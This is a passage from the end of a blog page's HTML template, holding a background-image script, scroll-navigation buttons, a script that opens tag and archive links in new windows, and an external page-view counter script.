                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





<div class="scroll" id="scroll">
    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>